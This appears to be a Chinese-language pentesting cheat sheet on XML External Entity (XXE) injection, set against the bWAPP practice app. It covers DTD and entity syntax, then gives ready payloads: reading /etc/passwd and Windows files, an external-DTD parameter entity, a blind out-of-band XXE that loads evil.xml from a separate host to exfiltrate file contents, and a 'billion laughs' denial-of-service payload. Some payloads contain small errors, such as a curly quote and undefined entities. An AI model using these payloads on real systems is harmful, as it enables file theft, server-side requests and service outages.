### XML外部实体注入

```
XML是一种可扩展的用于标记电子文件使其具有结构性的标记语言，允许用户对自己的标记语言进行定义的源语言。
XML负责传输数据。
HTML负责显示数据。
包括XML声明、DTD文档类型定义（可选）、文档元素

原因：对非安全的外部实体数据进行处理时引发的安全问题。

DTD文档有三种应用形式：
1.内部DTD文档
	<!DOCTYPE 根元素[定义内容]>
2.外部DTD文档
	<!DOCTYPE 根元素 SYSTEM "DTD文件路径">
3.内外部DTD文档结合
	<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>

危害：
1、任意文件读取
2、URL请求
3、dos拒绝服务

判定特征
1、POST
2、Content-Type: text/xml;
只要修改报文符合上述两个条件，可能存在XXE
```

|   类型   |                 普通实体                  |                  参数实体                   |
| :------: | :---------------------------------------: | :-----------------------------------------: |
| 使用场合 |               用于XML文档中               |        只用在DTD中元素和属性的声明中        |
| 内部声明 |        <!ENTITY 实体名 "文本内容">        |        <!ENTITY % 实体名 "文本内容">        |
| 外部声明 | <!ENTITY 实体名 SYSTEM "外部文件URL地址"> | <!ENTITY % 实体名 SYSTEM "外部文件URL地址"> |
| 引用方式 |                 &实体名；                 |                  %实体名；                  |

| 支持的协议 |                |          |       |
| :--------: | :------------: | :------: | :---: |
|  libxml2   |      PHP       |   Java   | .NET  |
|    file    |      file      |   http   | file  |
|    http    |      http      |  https   | http  |
|    ftp     |      ftp       |   ftp    | https |
|            |      php       |   file   |  ftp  |
|            | compress.zlib  |   jar    |       |
|            | compress.bzip2 |  netdoc  |       |
|            |      data      |  mailto  |       |
|            |      glob      | gopher * |       |
|            |      phar      |          |       |

### 外部普通实体

```
1、burp suite拦包
Content-Type: text/xml;
以POST方式向xxe-2.php页面传输了XML数据

拦包数据，如下：
POST /bWAPP/xxe-2.php HTTP/1.1
Host: 192.168.11.59:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Referer: http://192.168.11.59:9090/bWAPP/xxe-1.php
Content-Length: 178
Cookie: PHPSESSID=fb6cafed2bd6da5aa614b11f5a46ec2b; security_level=0
DNT: 1
Connection: close
<reset><login>bee</login><secret>Any bugs?</secret></reset>

2、构造payload

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note[
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<reset><login>&xxe;</login><secret>Any bugs?</secret></reset>

3、注意
使用xxe  &xxe;进行闭合
4、payload样例
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE poem [
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
	]>
<poem>
    &xxe;
</poem>
5、各种payload样例 
file://C:\Users\rugal\Desktop\1.txt   //读取windowswen文件
http://172.0.0.1
```

### 外部参数实体

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE % poem [
	<!ENTITY % a SYSTEM “http://www.test.com/outdtd.dtd">
% a;]>
<poem>&xxe;</poem>
outdtd.dtd
<!ELEMENT xxe SYSTEM "file:///etc/passwd">
```

### Blind OOB XXE

```
在某些情况下，即便服务器可能存在XXE，也不会向攻击者的浏览器或代理返回任何响应。遇到这种情况，我们可以使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据。

<?xml version="1.0"?>
<!DOCTYPE ANY[ 
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://192.168.11.65:8888/evil.xml">
%remote;
%all;
]>
<reset><login>&send;</login><secret>Any bugs?</secret></reset>

```

### XXE Dos

```
<?xml version="1.0"?>
   <!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```























